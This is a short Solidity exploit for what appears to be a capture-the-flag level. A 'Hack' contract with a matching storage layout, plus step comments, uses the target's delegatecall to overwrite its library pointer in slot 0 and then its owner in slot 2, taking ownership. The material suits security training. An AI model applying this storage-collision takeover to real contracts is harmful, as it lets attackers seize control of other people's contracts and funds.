// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;


contract Hack {
  
    address public timeZone1Library; // slot 0
    address public timeZone2Library; // slot 1
    uint storedTime; // slot 2
    address public owner; 

   
    function setTime(uint _time) public {
        storedTime = _time;
    }
}

// Hack
// Run the setFirstime with the deployed hackaddress as input
// delegate call sets storage at slot 0 as the address
// Hence timezoneLibrary becomes the hack address
// Rerun the setfirstime with players address as input
// storage slot 2 is set to your address which is owner